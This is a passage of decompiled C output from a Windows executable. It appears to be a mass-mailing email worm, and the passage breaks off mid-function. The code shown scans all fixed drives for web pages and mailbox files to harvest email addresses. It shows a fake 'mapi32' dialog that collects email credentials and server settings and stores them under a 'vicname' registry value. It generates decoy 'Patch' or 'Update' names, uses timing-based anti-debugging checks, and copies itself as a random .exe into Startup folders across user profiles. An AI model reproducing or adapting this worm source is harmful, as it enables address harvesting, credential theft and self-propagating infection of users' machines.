// 41A66C: using guessed type int dword_41A66C;

//----- (00406ACA) --------------------------------------------------------
void sub_406ACA()
{
  ;
}

//----- (00406AFD) --------------------------------------------------------
int __cdecl sub_406AFD(char *Str)
{
  int v1; // eax
  int v2; // eax
  int v3; // eax
  int v4; // eax
  unsigned int i; // [esp+Ch] [ebp-20h]
  DWORD TickCount; // [esp+10h] [ebp-1Ch]

  TickCount = GetTickCount();
  v1 = *Str;
  if ( 3 * v1 != 297 && 2 * v1 != 134 )
    return 0;
  if ( strlen(Str) != 4 )
    return 0;
  v2 = Str[2];
  if ( v2 != 114 && v2 != 82 )
    return 0;
  sub_406ACA();
  v3 = Str[1];
  if ( v3 != 117 && v3 != 85 )
    return 0;
  if ( GetTickCount() - TickCount >= 0x14 )
    return 0;
  v4 = Str[3];
  if ( v4 != 101 && 2 * v4 != 138 )
    return 0;
  for ( i = 0; i < 0x64; ++i )
    Sleep(5u);
  return 1;
}

//----- (00406BE3) --------------------------------------------------------
void __cdecl sub_406BE3(LPSTR lpCommandLine)
{
  char *v1; // eax
  const char *v2; // esi
  char *v3; // eax
  const char *v4; // edi
  int v5; // ebx
  char *v6; // edi
  struct _STARTUPINFOA StartupInfo; // [esp+Ch] [ebp-39Ch] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+50h] [ebp-358h] BYREF
  char *v9; // [esp+60h] [ebp-348h]
  CHAR Filename[552]; // [esp+64h] [ebp-344h] BYREF
  char *v11; // [esp+28Ch] [ebp-11Ch]
  char Destination[256]; // [esp+290h] [ebp-118h] BYREF
  CPPEH_RECORD ms_exc; // [esp+390h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  if ( strlen(lpCommandLine) < 4 )
    goto LABEL_2;
  v1 = strchr(lpCommandLine, 34);
  v9 = v1;
  if ( !v1 )
    return;
  v2 = v1 + 1;
  v9 = v1 + 1;
  v3 = strchr(v1 + 1, 34);
  v4 = v3;
  v11 = v3;
  if ( !v3 || v3 == v2 )
    return;
  v5 = v3 - v2;
  strncpy(Destination, v2, v3 - v2);
  Destination[v5] = 0;
  if ( sub_401000(Destination, 1) )
    goto LABEL_7;
  sub_4010E3(Destination, Filename);
  if ( Filename[0] )
  {
    if ( sub_401000(Filename, 0) )
      goto LABEL_7;
  }
  v9 = (char *)v4;
  if ( strlen(v4) <= 2 )
  {
    v9 = 0;
    goto LABEL_17;
  }
  v6 = (char *)(v4 + 2);
  v9 = v6;
  if ( sub_401000(v6, 0) )
  {
LABEL_7:
    sub_4069E2();
    return;
  }
  GetModuleFileNameA(0, Filename, 0x226u);
  if ( _strcmpi(Destination, Filename) )
  {
LABEL_17:
    memset(&StartupInfo.lpReserved, 0, 0x40u);
    StartupInfo.cb = 68;
    memset(&ProcessInformation, 0, sizeof(ProcessInformation));
    CreateProcessA(0, lpCommandLine, 0, 0, 0, 0x4000000u, 0, 0, &StartupInfo, &ProcessInformation);
LABEL_2:
    Sleep(0x4B0u);
    return;
  }
  if ( _strcmpi(v6, Parameters) )
  {
    if ( sub_406AFD(v6) )
      sub_409A73();
    goto LABEL_17;
  }
}
// 406BE3: using guessed type CHAR Destination[256];

//----- (00406DCD) --------------------------------------------------------
int __cdecl sub_406DCD(char *Destination)
{
  int result; // eax
  unsigned int v2; // eax
  char v3; // cl
  HKEY phkResult; // [esp+Ch] [ebp-98h] BYREF
  char Name[100]; // [esp+10h] [ebp-94h] BYREF
  DWORD cchName[2]; // [esp+74h] [ebp-30h] BYREF
  struct _FILETIME ftLastWriteTime; // [esp+7Ch] [ebp-28h] BYREF
  int v8; // [esp+84h] [ebp-20h]
  DWORD dwIndex; // [esp+88h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+8Ch] [ebp-18h]

  phkResult = 0;
  dwIndex = 0;
  cchName[0] = 100;
  ms_exc.registration.TryLevel = 0;
  *Destination = 0;
  RegOpenKeyExA(HKEY_LOCAL_MACHINE, SubKey, 0, 9u, &phkResult);
  if ( phkResult )
  {
    while ( 1 )
    {
      v2 = RegEnumKeyExA(phkResult, dwIndex, Name, cchName, 0, 0, 0, &ftLastWriteTime);
      if ( v2 )
        break;
      v8 = 0;
      while ( 1 )
      {
        cchName[1] = v2;
        if ( v2 >= cchName[0] )
          break;
        v3 = Name[v2];
        if ( v3 < 65 || v3 > 90 )
        {
          v8 = 0;
          break;
        }
        v8 = v8 + v3 - 64;
        ++v2;
      }
      if ( v8 == 80 )
      {
        strcpy(Destination, SubKey);
        strcat(Destination, asc_411910);
        strcat(Destination, Name);
        RegCloseKey(phkResult);
        result = 1;
        goto LABEL_12;
      }
      ++dwIndex;
      cchName[0] = 100;
    }
    RegCloseKey(phkResult);
    return 0;
  }
  else
  {
    result = 0;
LABEL_12:
    ms_exc.registration.TryLevel = -1;
  }
  return result;
}
// 406DCD: using guessed type CHAR Name[100];

//----- (00406F04) --------------------------------------------------------
int sub_406F04()
{
  HMODULE ModuleHandleA; // edi
  BOOL (__stdcall *InternetCloseHandle)(HINTERNET); // eax
  int result; // eax
  BOOL (__stdcall *InternetGetConnectedState)(LPDWORD, DWORD); // [esp+Ch] [ebp-44h]
  BOOL (__stdcall *v4)(HINTERNET); // [esp+10h] [ebp-40h]
  HINTERNET (__stdcall *InternetOpenA)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD); // [esp+14h] [ebp-3Ch]
  DWORD cbData; // [esp+18h] [ebp-38h] BYREF
  HKEY phkResult; // [esp+1Ch] [ebp-34h] BYREF
  BYTE Data[4]; // [esp+20h] [ebp-30h] BYREF
  DWORD Type; // [esp+24h] [ebp-2Ch] BYREF
  HMODULE v10; // [esp+28h] [ebp-28h]
  void *v11; // [esp+2Ch] [ebp-24h]
  int v12; // [esp+30h] [ebp-20h] BYREF
  BOOL v13; // [esp+34h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+38h] [ebp-18h]

  v12 = 0;
  ms_exc.registration.TryLevel = 0;
  ModuleHandleA = GetModuleHandleA(aWininetDll);
  v10 = ModuleHandleA;
  if ( !ModuleHandleA )
  {
    ModuleHandleA = LoadLibraryA(aWininetDll);
    v10 = ModuleHandleA;
    if ( !ModuleHandleA )
      goto LABEL_10;
  }
  InternetOpenA = (HINTERNET (__stdcall *)(LPCSTR, DWORD, LPCSTR, LPCSTR, DWORD))GetProcAddress(
                                                                                   ModuleHandleA,
                                                                                   aInternetopena);
  InternetGetConnectedState = (BOOL (__stdcall *)(LPDWORD, DWORD))GetProcAddress(ModuleHandleA, aInternetgetcon);
  InternetCloseHandle = (BOOL (__stdcall *)(HINTERNET))GetProcAddress(ModuleHandleA, aInternetcloseh);
  v4 = InternetCloseHandle;
  if ( !InternetOpenA || !InternetGetConnectedState || !InternetCloseHandle )
    goto LABEL_10;
  v11 = InternetOpenA(aWindowsExplore, 0, 0, 0, 0x20000000);
  v13 = InternetGetConnectedState((LPDWORD)&v12, 0);
  if ( v11 )
    v4(v11);
  if ( v13 )
  {
    ms_exc.registration.TryLevel = -1;
    return 1;
  }
  else
  {
LABEL_10:
    *(_DWORD *)Data = 0;
    cbData = 4;
    RegOpenKeyExA(HKEY_LOCAL_MACHINE, aSystemCurrentc, 0, 1u, &phkResult);
    RegQueryValueExA(phkResult, ValueName, 0, &Type, Data, &cbData);
    RegCloseKey(phkResult);
    if ( *(_DWORD *)Data )
    {
      result = 1;
    }
    else
    {
      dword_41A604 = 0;
      result = 0;
    }
    ms_exc.registration.TryLevel = -1;
  }
  return result;
}
// 41A604: using guessed type int dword_41A604;

//----- (0040703C) --------------------------------------------------------
HWND __cdecl sub_40703C(int a1, HWND hWnd)
{
  int v2; // esi
  HWND DlgItem; // eax
  CHAR Text[52]; // [esp+4h] [ebp-34h] BYREF

  if ( a1 )
  {
    if ( a1 == 1 )
    {
      strcpy(Text, aInvalidServerN);
      v2 = 1004;
    }
    else if ( a1 == 2 )
    {
      strcpy(Text, aPasswordsDoNot);
      v2 = 1008;
    }
    else
    {
      v2 = (int)hWnd;
    }
  }
  else
  {
    strcpy(Text, aInvalidEmailAd);
    v2 = 1003;
  }
  MessageBoxA(hWnd, Text, aMapi32, 0x30u);
  DlgItem = GetDlgItem(hWnd, v2);
  return SetFocus(DlgItem);
}

//----- (004070C1) --------------------------------------------------------
int __cdecl sub_4070C1(HWND hDlg)
{
  char *v1; // eax
  unsigned int v2; // eax
  int result; // eax
  DWORD nSize; // [esp+10h] [ebp-148h] BYREF
  CHAR Source[100]; // [esp+14h] [ebp-144h] BYREF
  CHAR String[100]; // [esp+78h] [ebp-E0h] BYREF
  CHAR Destination[100]; // [esp+DCh] [ebp-7Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+140h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  GetDlgItemTextA(hDlg, 1003, String, 100);
  if ( !sub_4075E3(String, 1) )
  {
    sub_40703C(0, hDlg);
LABEL_5:
    ms_exc.registration.TryLevel = -1;
    return 0;
  }
  GetDlgItemTextA(hDlg, 1004, Source, 100);
  if ( !sub_4075E3(Source, 0) )
  {
    sub_40703C(1, hDlg);
    goto LABEL_5;
  }
  strcpy((char *)&Data, String);
  strcpy((char *)&cp, Source);
  sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aEmailAddress, 1u, (LPCSTR)&Data);
  sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aServer_0, 1u, (LPCSTR)&cp);
  GetDlgItemTextA(hDlg, 1002, String, 100);
  if ( !strlen(String) )
  {
    nSize = 100;
    if ( !GetComputerNameA(String, &nSize) )
      strcpy(String, aUnknown);
  }
  sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aVicname, 1u, String);
  GetDlgItemTextA(hDlg, 1008, Source, 100);
  GetDlgItemTextA(hDlg, 1009, Destination, 100);
  if ( !strlen(Source) && !strlen(Destination) )
    goto LABEL_21;
  if ( !strcmp(Source, Destination) )
  {
    GetDlgItemTextA(hDlg, 1007, String, 100);
    GetDlgItemTextA(hDlg, 1010, Destination, 100);
    if ( !strlen(String) )
    {
      strcpy(String, (const char *)&Data);
      v1 = strchr(String, 64);
      if ( v1 )
        *v1 = 0;
    }
    if ( !strlen(Destination) || !sub_4075E3(Destination, 0) )
      strcpy(Destination, (const char *)&cp);
    sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aLogin, 1u, String);
    strcpy((char *)&byte_412E94, String);
    sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aPass, 1u, Source);
    strcpy((char *)&byte_41A5A0, Source);
    sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aPopServer, 1u, Destination);
    strcpy((char *)&byte_41A530, Destination);
    v2 = sub_406850(0xFu);
    sub_40696B((int)String, v2 + 10);
    sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aXId_0, 1u, String);
    strcpy((char *)&byte_412E74, String);
    dword_41A6D8 = 1;
LABEL_21:
    result = 1;
    goto LABEL_13;
  }
  sub_40703C(2, hDlg);
  result = 0;
LABEL_13:
  ms_exc.registration.TryLevel = -1;
  return result;
}
// 41A6D8: using guessed type int dword_41A6D8;

//----- (004073F8) --------------------------------------------------------
LPSTR __cdecl sub_4073F8(LPSTR lpsz)
{
  unsigned int v1; // eax
  unsigned int v2; // eax
  unsigned int v3; // eax
  bool v4; // zf
  const char *v5; // eax
  unsigned int v6; // eax
  unsigned int v7; // eax
  unsigned int v8; // eax
  const char *v9; // eax
  const char *v10; // eax
  const char *v11; // eax
  const char *v12; // eax
  const char *v13; // eax
  unsigned int v14; // eax
  const char *v15; // eax
  char v17[12]; // [esp+Ch] [ebp-24h] BYREF
  CPPEH_RECORD ms_exc; // [esp+18h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  *lpsz = 0;
  v1 = sub_406850(4u) - 1;
  if ( !v1 )
  {
    v4 = !sub_406840(0x32u);
    v13 = aQ_0;
    if ( v4 )
      v13 = aQ;
    strcat(lpsz, v13);
    if ( sub_406840(0x14u) )
    {
      v14 = sub_406850(4u);
      v9 = (const char *)sub_4068F4((int)v17, v14);
      goto LABEL_16;
    }
    v15 = (const char *)sub_40696B((int)v17, 6u);
    strcat(lpsz, v15);
    goto LABEL_32;
  }
  v2 = v1 - 1;
  if ( v2 )
  {
    v3 = v2 - 1;
    if ( v3 )
    {
      if ( v3 == 1 )
      {
        v4 = !sub_406840(0x32u);
        v5 = aI_1;
        if ( v4 )
          v5 = aI_0;
        strcat(lpsz, v5);
        v6 = sub_406850(3u) - 1;
        if ( v6 )
        {
          v7 = v6 - 1;
          if ( v7 )
          {
            if ( v7 == 1 )
              strcat(lpsz, aNstaller);
          }
          else
          {
            strcat(lpsz, aNstallation);
          }
        }
        else
        {
          strcat(lpsz, aNstall);
        }
        if ( sub_406840(0x4Bu) )
        {
          v8 = sub_406850(3u);
LABEL_15:
          v9 = (const char *)sub_40696B((int)v17, v8);
LABEL_16:
          strcat(lpsz, v9);
          goto LABEL_32;
        }
      }
      goto LABEL_32;
    }
    v4 = !sub_406840(0x32u);
    v10 = aU_0;
    if ( v4 )
      v10 = aU;
    strcat(lpsz, v10);
    v4 = !sub_406840(0x32u);
    v11 = aPdate;
    if ( v4 )
      v11 = aPgrade;
  }
  else
  {
    v4 = !sub_406840(0x32u);
    v12 = aP_0;
    if ( v4 )
      v12 = aP;
    strcat(lpsz, v12);
    v4 = !sub_406840(0x32u);
    v11 = aAtch;
    if ( v4 )
      v11 = aAck;
  }
  strcat(lpsz, v11);
  if ( sub_406840(0x4Bu) )
  {
    v8 = sub_406850(3u) + 1;
    goto LABEL_15;
  }
LABEL_32:
  if ( sub_406840(0xFu) )
    CharUpperA(lpsz);
  return lpsz;
}

//----- (004075E3) --------------------------------------------------------
BOOL __cdecl sub_4075E3(LPSTR lpsz, int a2)
{
  char *v2; // eax
  char *v3; // eax
  const char *v4; // esi
  char v5; // al
  signed int i; // [esp+10h] [ebp-20h]
  signed int v8; // [esp+14h] [ebp-1Ch]

  v2 = strchr(lpsz, 63);
  if ( v2 )
    *v2 = 0;
  v8 = strlen(lpsz);
  if ( v8 < 5 )
    return 0;
  if ( !strchr(lpsz, 46) )
    return 0;
  if ( a2 )
  {
    CharLowerA(lpsz);
    if ( v8 > 63 )
      return 0;
    if ( *lpsz == 64 )
      return 0;
    v3 = strchr(lpsz, 64);
    if ( !v3 )
      return 0;
    if ( *(v3 - 1) == 46 )
      return 0;
    v4 = v3 + 1;
    if ( v3[1] == 46 || !strchr(v3, 46) || strchr(v4, 64) || strstr(lpsz, aSpam) || strstr(lpsz, aDelete) )
      return 0;
  }
  for ( i = 0; i < v8; ++i )
  {
    v5 = lpsz[i];
    if ( v5 < 33 || v5 == 127 )
      return 0;
  }
  return strpbrk(lpsz, Control) == 0;
}
// 40765F: conditional instruction was optimized away because %arg_4.4!=0

//----- (0040772C) --------------------------------------------------------
void *__cdecl sub_40772C(HWND hWnd)
{
  unsigned int v1; // edi
  void *result; // eax
  DWORD LogicalDrives; // ebx
  CHAR RootPathName; // [esp+1Ch] [ebp-128h] BYREF
  char v5[4]; // [esp+1Dh] [ebp-127h] BYREF
  DWORD v6; // [esp+120h] [ebp-24h]
  void *Block; // [esp+128h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+12Ch] [ebp-18h]

  v1 = 0;
  ms_exc.registration.TryLevel = 0;
  sub_401BE7(&dword_41A818);
  result = operator new(0x13880u);
  Block = result;
  if ( result )
  {
    LogicalDrives = GetLogicalDrives();
    v6 = LogicalDrives;
    while ( v1 < 0x1A )
    {
      if ( ((1 << v1) & LogicalDrives) != 0 )
      {
        RootPathName = v1 + 65;
        strcpy(v5, ":\\");
        if ( GetDriveTypeA(&RootPathName) == 3 )
          sub_40786C(&RootPathName, Block, hWnd);
      }
      ++v1;
    }
    operator delete(Block);
    wsprintfA(&RootPathName, "%s\\germs0.dbv", Buffer);
    sub_401C5A(&dword_41A818, &RootPathName);
    sub_401BE7(&dword_41A818);
    dword_412E0C = 1;
    return (void *)sub_4066EB(HKEY_LOCAL_MACHINE, Destination, aCacheboxOutfit, 1u, String);
  }
  return result;
}
// 412E0C: using guessed type int dword_412E0C;
// 41A818: using guessed type int dword_41A818;

//----- (0040786C) --------------------------------------------------------
HANDLE __cdecl sub_40786C(char *Source, LPVOID lpBuffer, HWND hWnd)
{
  char *v3; // ebx
  HANDLE result; // eax
  char *v5; // eax
  const char *v6; // ebx
  HANDLE FileA; // eax
  void *v8; // ebx
  DWORD NumberOfBytesRead; // [esp+10h] [ebp-374h] BYREF
  DWORD nNumberOfBytesToRead; // [esp+14h] [ebp-370h]
  CHAR FileName[260]; // [esp+18h] [ebp-36Ch] BYREF
  char *v12; // [esp+11Ch] [ebp-268h]
  char *v13; // [esp+120h] [ebp-264h]
  struct _WIN32_FIND_DATAA FindFileData; // [esp+124h] [ebp-260h] BYREF
  CHAR v15[260]; // [esp+264h] [ebp-120h] BYREF
  HANDLE hFindFile; // [esp+368h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+36Ch] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  sub_408962(hWnd);
  v3 = Source;
  if ( Source[strlen(Source) - 1] == 92 )
    Source[strlen(Source) - 1] = 0;
  strcpy(FileName, Source);
  strcat(FileName, asc_411ADC);
  result = FindFirstFileA(FileName, &FindFileData);
  hFindFile = result;
  if ( result != (HANDLE)-1 )
  {
    while ( 1 )
    {
      if ( (FindFileData.dwFileAttributes & 0x10) != 0 )
      {
        if ( strcmp(FindFileData.cFileName, asc_410CD4) )
        {
          if ( strcmp(FindFileData.cFileName, asc_411AD8) )
          {
            wsprintfA(v15, "%s\\%s", v3, FindFileData.cFileName);
            sub_40786C(v15, lpBuffer, hWnd);
          }
        }
      }
      else
      {
        v12 = 0;
        v13 = 0;
        CharLowerA(FindFileData.cFileName);
        v5 = strrchr(FindFileData.cFileName, 46);
        v6 = v5;
        v12 = v5;
        if ( v5 )
        {
          v13 = strstr(v5, aHt);
          if ( v13 || (v13 = strstr(v6, aAsp)) != 0 )
          {
            wsprintfA(v15, "%s\\%s", Source, FindFileData.cFileName);
            sub_407B30(v15, lpBuffer);
          }
          else if ( !_strcmpi(v6, aMbx) || !_strcmpi(v6, aDbx) || !_strcmpi(v6, aWab) || !_strcmpi(v6, aEml) )
          {
            wsprintfA(v15, "%s\\%s", Source, FindFileData.cFileName);
            FileA = CreateFileA(v15, 0x80000000, 3u, 0, 3u, 0x80u, 0);
            v8 = FileA;
            if ( FileA != (HANDLE)-1 )
            {
              nNumberOfBytesToRead = GetFileSize(FileA, 0);
              if ( nNumberOfBytesToRead >= 0x13880 )
                nNumberOfBytesToRead = 79999;
              ReadFile(v8, lpBuffer, nNumberOfBytesToRead, &NumberOfBytesRead, 0);
              CloseHandle(v8);
              if ( nNumberOfBytesToRead > 0x64 )
                sub_407CBA((int)lpBuffer, nNumberOfBytesToRead);
            }
          }
        }
      }
      if ( !FindNextFileA(hFindFile, &FindFileData) )
        break;
      v3 = Source;
    }
    return (HANDLE)FindClose(hFindFile);
  }
  return result;
}

//----- (00407B30) --------------------------------------------------------
HANDLE __cdecl sub_407B30(LPCSTR lpFileName, LPVOID lpBuffer)
{
  HANDLE result; // eax
  HANDLE v3; // esi
  DWORD FileSize; // eax
  DWORD v5; // edi
  const char *v6; // esi
  char *v7; // eax
  char *v8; // edi
  int v9; // eax
  char v10; // dl
  int i; // [esp+10h] [ebp-30h]
  HANDLE hFile; // [esp+1Ch] [ebp-24h]
  DWORD NumberOfBytesRead; // [esp+24h] [ebp-1Ch] BYREF
  CPPEH_RECORD ms_exc; // [esp+28h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  Sleep(0);
  result = CreateFileA(lpFileName, 0x80000000, 3u, 0, 3u, 0, 0);
  v3 = result;
  hFile = result;
  if ( result != (HANDLE)-1 )
  {
    FileSize = GetFileSize(result, 0);
    v5 = FileSize;
    if ( FileSize == -1 || FileSize < 0x32 )
    {
      return (HANDLE)CloseHandle(v3);
    }
    else
    {
      if ( FileSize > 0x13880 )
        v5 = 79995;
      v6 = (const char *)lpBuffer;
      if ( ReadFile(hFile, lpBuffer, v5, &NumberOfBytesRead, 0) )
      {
        *((_BYTE *)lpBuffer + v5) = 0;
        CharLowerA((LPSTR)lpBuffer);
        while ( 1 )
        {
          v7 = strstr(v6 + 1, aMailto);
          v8 = v7;
          if ( !v7 )
            break;
          v6 = strchr(v7, 34);
          if ( !v6 )
          {
            v6 = strchr(v8, 39);
            if ( !v6 )
              break;
          }
          if ( v6 - v8 >= 12 )
          {
            for ( i = 7; i < v6 - v8; ++i )
            {
              if ( v8[i] > 32 && v8[i] != 127 )
              {
                v8 += i;
                break;
              }
            }
            v9 = v6 - v8;
            while ( --v9 > 3 )
            {
              v10 = v8[v9];
              if ( v10 > 32 && v10 != 127 )
              {
                v8[v9 + 1] = 0;
                break;
              }
            }
            if ( sub_4075E3(v8, 1) )
              sub_401B22((char **)&dword_41A818, v8, 1);
          }
        }
      }
      return (HANDLE)CloseHandle(hFile);
    }
  }
  return result;
}
// 41A818: using guessed type int dword_41A818;

//----- (00407CBA) --------------------------------------------------------
int __cdecl sub_407CBA(int a1, unsigned int a2)
{
  int result; // eax
  char *v3; // eax
  char *v4; // eax
  int i; // ecx
  char v6; // dl
  char *v7; // ecx
  char v8; // dl
  unsigned int v9; // ecx
  size_t v10; // esi
  int v11; // [esp+10h] [ebp-80h]
  char *Source; // [esp+14h] [ebp-7Ch]
  char *Sourcea; // [esp+14h] [ebp-7Ch]
  unsigned int j; // [esp+18h] [ebp-78h]
  unsigned int k; // [esp+18h] [ebp-78h]
  char Destination[60]; // [esp+20h] [ebp-70h] BYREF
  char *v17; // [esp+5Ch] [ebp-34h]
  char v18[16]; // [esp+60h] [ebp-30h] BYREF
  unsigned int v19; // [esp+70h] [ebp-20h]
  char *v20; // [esp+74h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+78h] [ebp-18h]

  strcpy(v18, "()<>,;:\\\"[]?@");
  v11 = 0;
  ms_exc.registration.TryLevel = 0;
  Sleep(0);
  if ( a1 )
  {
    v20 = (char *)a1;
    while ( 1 )
    {
      v17 = v20 + 1;
      v3 = (char *)memchr(v20 + 1, 64, a2 + a1 - (_DWORD)(v20 + 1));
      v20 = v3;
      if ( !v3 )
        break;
      v4 = &v3[-a1];
      Source = 0;
      for ( i = (int)(v4 - 1); i >= 0; --i )
      {
        v6 = *(_BYTE *)(i + a1);
        if ( v6 < 33 || v6 == 127 )
        {
          Source = (char *)(a1 + i);
          break;
        }
        for ( j = 0; j < 0xD; ++j )
        {
          if ( v6 == v18[j] )
          {
            Source = (char *)(i + a1);
            break;
          }
        }
        if ( Source )
          goto LABEL_21;
      }
      if ( !Source )
      {
        Sourcea = (char *)a1;
        goto LABEL_22;
      }
LABEL_21:
      Sourcea = Source + 1;
LABEL_22:
      if ( v20 - Sourcea <= 50 && v20 != Sourcea )
      {
        v7 = 0;
        v17 = 0;
        while ( (unsigned int)++v4 < a2 )
        {
          v8 = v4[a1];
          if ( v8 < 33 || v8 == 127 )
          {
            v7 = &v4[a1];
            v17 = &v4[a1];
            break;
          }
          for ( k = 0; k < 0xD; ++k )
          {
            if ( v8 == v18[k] )
            {
              v7 = &v4[a1];
              v17 = &v4[a1];
              break;
            }
          }
          if ( v7 )
            goto LABEL_37;
        }
        if ( !v7 )
          continue;
LABEL_37:
        v19 = v7 - v20;
        if ( (unsigned int)(v7 - v20) >= 4 && (unsigned int)(v7 - v20) <= 0x32 )
        {
          v9 = v7 - Sourcea;
          v10 = v9;
          v19 = v9;
          if ( v9 <= 0x3C && v9 >= 5 )
          {
            memset(Destination, 0, sizeof(Destination));
            strncpy(Destination, Sourcea, v10);
            if ( sub_4075E3(Destination, 1) )
            {
              if ( sub_401B22((char **)&dword_41A818, Destination, 1) )
                v11 = 1;
            }
          }
        }
      }
    }
    result = v11;
  }
  else
  {
    result = 0;
  }
  ms_exc.registration.TryLevel = -1;
  return result;
}
// 41A818: using guessed type int dword_41A818;

//----- (00407E9C) --------------------------------------------------------
HANDLE __cdecl sub_407E9C(const char *a1)
{
  unsigned int v1; // eax
  HANDLE result; // eax
  HANDLE v3; // edi
  DWORD v4; // eax
  char Destination[100]; // [esp+Ch] [ebp-184h] BYREF
  DWORD NumberOfBytesWritten; // [esp+70h] [ebp-120h] BYREF
  CHAR FileName[252]; // [esp+74h] [ebp-11Ch] BYREF
  char *v8; // [esp+170h] [ebp-20h]
  HANDLE hObject; // [esp+174h] [ebp-1Ch]
  CPPEH_RECORD ms_exc; // [esp+178h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  if ( !sub_40679E(HKEY_LOCAL_MACHINE, ::Destination, aUnfile, (LPBYTE)Destination) )
  {
    v1 = sub_406850(5u);
    sub_4068F4((int)Destination, v1 + 3);
    strcat(Destination, asc_410CD4);
    NumberOfBytesWritten = strlen(Destination);
    v8 = &Destination[NumberOfBytesWritten];
    sub_4068F4((int)&Destination[NumberOfBytesWritten], 3u);
    sub_4066EB(HKEY_LOCAL_MACHINE, ::Destination, aUnfile, 1u, Destination);
  }
  wsprintfA(FileName, "%s\\%s", Buffer, Destination);
  result = CreateFileA(FileName, 0x40000000u, 3u, 0, 4u, 0x80u, 0);
  v3 = result;
  hObject = result;
  if ( result != (HANDLE)-1 )
  {
    SetFilePointer(result, 0, 0, 2u);
    wsprintfA(FileName, "%s\r\n", a1);
    v4 = strlen(FileName);
    WriteFile(v3, FileName, v4, &NumberOfBytesWritten, 0);
    return (HANDLE)CloseHandle(v3);
  }
  return result;
}
// 407E9C: using guessed type BYTE Destination[100];

//----- (00408003) --------------------------------------------------------
int __cdecl sub_408003(char *Source, LPCSTR lpExistingFileName)
{
  int result; // eax
  char *v3; // eax
  DWORD FileAttributesA; // eax
  unsigned int v5; // eax
  const char *v6; // eax
  char *v7; // eax
  DWORD v8; // eax
  unsigned int v9; // eax
  _BYTE Destination[97]; // [esp+Ch] [ebp-25Ch] BYREF
  __int16 v11; // [esp+6Dh] [ebp-1FBh]
  char v12; // [esp+6Fh] [ebp-1F9h]
  char v13[16]; // [esp+70h] [ebp-1F8h] BYREF
  unsigned int v14; // [esp+80h] [ebp-1E8h]
  char v15[24]; // [esp+84h] [ebp-1E4h] BYREF
  unsigned int v16; // [esp+9Ch] [ebp-1CCh]
  unsigned int i; // [esp+A0h] [ebp-1C8h]
  unsigned int v18; // [esp+A4h] [ebp-1C4h]
  CHAR FileName[260]; // [esp+A8h] [ebp-1C0h] BYREF
  DWORD v20; // [esp+1ACh] [ebp-BCh]
  char *v21; // [esp+1B0h] [ebp-B8h]
  char v22[24]; // [esp+1B4h] [ebp-B4h] BYREF
  char Str[97]; // [esp+1CCh] [ebp-9Ch] BYREF
  __int16 v24; // [esp+22Dh] [ebp-3Bh]
  char v25; // [esp+22Fh] [ebp-39h]
  char String2[32]; // [esp+230h] [ebp-38h] BYREF
  CPPEH_RECORD ms_exc; // [esp+250h] [ebp-18h]

  ms_exc.registration.TryLevel = 0;
  memset(Str, 0, sizeof(Str));
  v24 = 0;
  v25 = 0;
  memset(&Destination[1], 0, 0x60u);
  v11 = 0;
  v12 = 0;
  strcpy(String2, "\\Start menu\\Programs\\Startup");
  strcpy(v22, "Documents and Settings\\");
  strcpy(v13, "Winnt\\Profiles\\");
  strcpy(v15, "abcdefghjklmnorstvwxyz");
  v14 = 3;
  strcpy(Destination, SubKey);
  strcat(Destination, aShellFolders);
  if ( sub_40679E(HKEY_CURRENT_USER, Destination, aStartup, (LPBYTE)Str) )
  {
    v21 = strchr(Str, 92);
    strcpy(Str, v21 + 1);
    v21 = strchr(Str, 92);
    strcpy(Str, v21);
    if ( !_strcmpi(Str, String2) )
      v14 = 2;
  }
  result = 1;
  v18 = 1;
LABEL_5:
  if ( v18 <= 4 )
  {
    i = 1;
    while ( 1 )
    {
      if ( i > v14 )
      {
        ++v18;
        goto LABEL_5;
      }
      strcpy(FileName, Source);
      switch ( v18 )
      {
        case 1u:
          strcat(FileName, aWindows);
          break;
        case 2u:
          strcat(FileName, aWinme);
          break;
        case 3u:
          strcat(FileName, aWin95);
          break;
        case 4u:
          strcat(FileName, aWin98);
          break;
      }
      if ( i == 1 )
      {
        strcat(FileName, aAllUsers);
        strcat(FileName, String2);
      }
      else
      {
        if ( i == 2 )
        {
          v3 = String2;
        }
        else
        {
          if ( i != 3 )
            goto LABEL_23;
          v3 = Str;
        }
        strcat(FileName, v3);
      }
LABEL_23:
      FileAttributesA = GetFileAttributesA(FileName);
      v20 = FileAttributesA;
      if ( (FileAttributesA & 0x10) != 0 && FileAttributesA != -1 )
      {
        v5 = sub_406850(6u);
        sub_4068F4((int)Destination, v5 + 4);
        Destination[0] = v15[sub_406850(0x16u)];
        strcat(FileName, asc_411910);
        strcat(FileName, Destination);
        strcat(FileName, aExe);
        CopyFileA(lpExistingFileName, FileName, 1);
      }
      ++i;
      result = 1;
    }
  }
  v18 = 1;
LABEL_29:
  if ( v18 <= 2 )
  {
    for ( i = 1; ; ++i )
    {
      if ( i > 3 )
      {
        ++v18;
        goto LABEL_29;
      }
      v16 = 1;
      while ( v16 < v14 )
      {
        strcpy(FileName, Source);
        if ( v18 == 1 )
        {
          v6 = v22;
        }
        else
        {
          if ( v18 != 2 )
            goto LABEL_39;
          v6 = v13;
        }
        strcat(FileName, v6);
LABEL_39:
        switch ( i )
        {
          case 1u:
            strcat(FileName, aAllUsers_0);
            break;
          case 2u:
            strcat(FileName, aDefaultUser);
            break;
          case 3u:
            strcat(FileName, aAdministrator);
            break;
        }
        if ( v16 == 1 )
        {
          v7 = String2;
          goto LABEL_49;
        }
        if ( v16 == 2 )
        {
          v7 = Str;
LABEL_49:
